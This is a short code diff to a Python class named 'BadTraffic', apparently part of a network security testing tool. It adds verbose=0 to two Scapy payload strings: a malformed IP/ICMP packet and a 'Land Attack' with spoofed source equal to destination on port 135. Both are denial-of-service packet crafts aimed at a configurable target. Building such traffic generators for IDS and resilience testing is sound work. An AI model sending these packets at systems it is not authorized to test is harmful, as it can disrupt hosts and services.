@@ -25,7 +25,7 @@ class BadTraffic():
         self.payloads.append([
             "Malformed Traffic",
             "scapy",
-            """send(IP(dst="%s", ihl=2, version=3)/ICMP())""" % self._target,
+            """send(IP(dst="%s", ihl=2, version=3)/ICMP(), verbose=0)""" % self._target,
             ""
             ])
 
@@ -33,7 +33,7 @@ class BadTraffic():
         self.payloads.append([
             "Land Attack",
             "scapy",
-            """send(IP(src="%s",dst="%s")/TCP(sport=135,dport=135))""" % (self._target, self._target),
+            """send(IP(src="%s",dst="%s")/TCP(sport=135,dport=135), verbose=0)""" % (self._target, self._target),
             ""
             ])
 
